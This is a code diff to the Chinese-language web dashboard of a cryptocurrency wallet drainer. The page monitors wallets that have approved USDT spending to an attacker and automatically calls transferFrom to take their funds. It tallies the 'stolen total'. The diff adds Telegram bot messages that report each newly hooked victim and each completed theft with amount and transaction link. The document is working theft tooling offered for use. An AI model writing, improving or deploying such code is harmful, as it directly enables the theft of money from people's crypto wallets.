@@ -2,7 +2,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🌟 EOA 控制台 v1.6.2➟確認按鍵 + 新授權提示 + Telegram</title>
+  <title>🌟 EOA 控制台 v1.6.4 (攻擊通知 + 金額統計)</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -21,13 +21,13 @@
   </style>
 </head>
 <body>
-  <h2>🌟 EOA 控制台 v1.6.2➟確認按鍵 + 新授權提示 + Telegram</h2>
+  <h2>🌟 EOA 控制台 v1.6.4 (攻擊通知 + 金額統計)</h2>
   <p><b>目前登入帳號：</b><span id="account">--</span></p>
   <button onclick="connect()">🔑 點我登入 MetaMask</button>
   <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
   <p><b>攻擊者 USDT 餘額：</b><span id="mybalance">--</span></p>
   <p><b>最後刷新時間：</b><span id="refresh">--</span></p>
-  <p><b>累積盜取金額：</b><span id="total">0 USDT</span></p>
+  <p><b>統計金額：</b><span id="total">0 USDT</span></p>
   <p><b>自動攻擊狀態：</b><span id="mode" class="bad">已停用</span></p>
   <button onclick="toggleAuto()">🔄 切換自動攻擊</button>
   <p id="notify"></p>
@@ -114,7 +114,7 @@
           notifyNewApproval(owner);
         }
 
-        const time = new Date().toLocaleString();
+        const time = new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" });
         const tr = document.createElement("tr");
         tr.innerHTML = `<td>${owner}</td><td>${time}</td><td class="status" id="status-${owner}">尚未攻擊</td>`;
         tbody.appendChild(tr);
@@ -122,12 +122,23 @@
         if (autoEnabled) await autoSteal(owner);
       }
 
-      document.getElementById("refresh").innerText = new Date().toLocaleTimeString();
+      document.getElementById("refresh").innerText = new Date().toLocaleTimeString("zh-TW", { timeZone: "Asia/Taipei" });
     }
 
     async function notifyNewApproval(addr) {
-      document.getElementById("notify").innerText = `🆒 新授權地址：${addr}`;
-      const text = `🐟 上魚\n👤 地址：${addr}\n🕐 時間：${new Date().toLocaleString()}\n✅ 已授權給攻擊者`;
+      document.getElementById("notify").innerText = `🌀 新授權地址：${addr}`;
+      const text = `🐟 上魚\n👤 地址：${addr}\n🕐 時間：${new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" })}\n✅ 已授權給攻擊者`;
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
+      });
+    }
+
+    async function notifyAttackSuccess(addr, amount, txHash) {
+      const time = new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" });
+      const total = ethers.utils.formatUnits(totalStolen, 6);
+      const text = `☑️攻擊完成\n👤 地址：${addr}\n🕐 時間：${time}\n💰 金額：${amount} USDT\n💼 總額：${total} USDT\nhttps://etherscan.io/tx/${txHash}`;
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -144,13 +155,18 @@
       if (amount.isZero()) return;
       const tx = await contract.transferFrom(victim, attacker, amount);
       totalStolen = totalStolen.add(amount);
+
+      const formatted = ethers.utils.formatUnits(amount, 6);
       document.getElementById("total").innerText = ethers.utils.formatUnits(totalStolen, 6) + " USDT";
-      document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
+      document.getElementById("status").innerHTML = `✅ TX Hash: <a href="https://etherscan.io/tx/${tx.hash}" target="_blank">${tx.hash}</a>`;
+
       const row = document.getElementById(`status-${victim}`);
       if (row) {
-        row.innerText = "✅ 已攻擊";
+        row.innerText = `✅ 成功 (${formatted} USDT)`;
         row.className = "ok";
       }
+
+      await notifyAttackSuccess(victim, formatted, tx.hash);
       attackedSet.add(victim);
     }
 
